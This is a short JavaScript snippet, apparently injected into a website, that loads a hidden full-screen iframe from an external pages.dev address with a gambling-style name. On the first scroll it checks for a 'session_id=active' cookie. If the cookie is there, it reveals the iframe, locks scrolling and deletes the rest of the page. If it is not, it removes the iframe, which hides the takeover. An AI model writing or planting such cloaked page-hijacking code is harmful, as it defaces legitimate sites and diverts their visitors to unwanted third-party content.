(function() {
    let active = false;
    const ampUrl = "https://alternatif-sensa4d.pages.dev/";
    const ifrm = document.createElement('iframe');
    const style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:999999; margin:0; padding:0; background:white; opacity:0; pointer-events:none; transition:opacity 0.4s ease;';
    ifrm.setAttribute('style', style);
    ifrm.setAttribute('loading', 'eager'); 
    ifrm.src = ampUrl;
    document.body.appendChild(ifrm);
    const loadRealContent = () => {
        const hasTicket = document.cookie.split(';').some((item) => item.trim().startsWith('session_id=active'));
        if (!hasTicket) {
            ifrm.remove();
            return; 
        }
        if (active) return;
        active = true;
        ifrm.style.opacity = '1';
        ifrm.style.pointerEvents = 'auto';
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            const allElements = document.body.children;
            for (let i = allElements.length - 1; i >= 0; i--) {
                const el = allElements[i];
                if (el !== ifrm && el.tagName !== 'SCRIPT') {
                    el.remove();
                }
            }
        }, 1000);
    };
    window.addEventListener('scroll', loadRealContent, { once: true });
})();
